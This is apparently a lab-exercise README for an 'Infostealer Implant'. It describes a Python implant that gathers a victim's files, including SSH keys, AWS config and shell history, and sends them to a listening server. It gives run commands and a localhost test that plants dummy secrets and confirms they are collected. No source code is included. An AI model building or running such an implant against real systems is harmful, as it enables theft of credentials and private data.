Infostealer Implant 

Description:
This implant consists of two files: the malware implant and server. The malware implant (tmp363.py) scans a victim's systems for files and exfiltrate them to the server. The server (server363.py) accepts the data from each victim and write it on disk.

Dependencies:
- cryptography (Fernet): key is hardcoded
- os
- sys
- io
- socket 
- zipfile 
- time

Usage:
- 64 bit Kali Linux Virtual Machine
On one server: python3 server363.py [IP_ADDRESS] [PORT_NUMBER]
Another server: sudo python3 tmp363.py [IP_ADDRESS] [PORT_NUMBER]

Example Run:
1) Create a dummy user: ex. victim1
sudo adduser victim1

2) Create data for dummy user
//make directories for data
sudo mkdir -p /home/victim1/.ssh /home/victim1/.aws /home/victim1/.config
//put in data in directories
ex. echo "TEST_PRIVATE_KEY" > /home/victim1/.ssh/id_rsa; echo "HIST123" | sudo tee /home/victim1/.bash_history > /dev/null

3) Test server and implant connection
//set server on one terminal
python3 server363.py [IP_ADDRESS] [PORT_NUMBER]
should be expecting: [*] Listening on 127.0.0.1:12345
//set up implant on another 
sudo python3 tmp363.py [IP_ADDRESS] [PORT_NUMBER] 
connection should be working from server terminal: [+] Connection from 127.0.0.1

4) After connecting a subdirectory should be made: 
ex format: YEAR-MONTH-DAY:TIME_[IP_ADDRESS]

5) after cd into it, run 'find .' and you should find:
./victim1/.ssh/id_rsa
./victim1/.bash_history

6) after using cat, you should find the contents made from that data
cat victim1/.bash_history: HIST123
cat victim1/.ssh/id_rsa: TEST_PRIVATE_KEY

7) Server should terminate gracefully after running ctrl + c




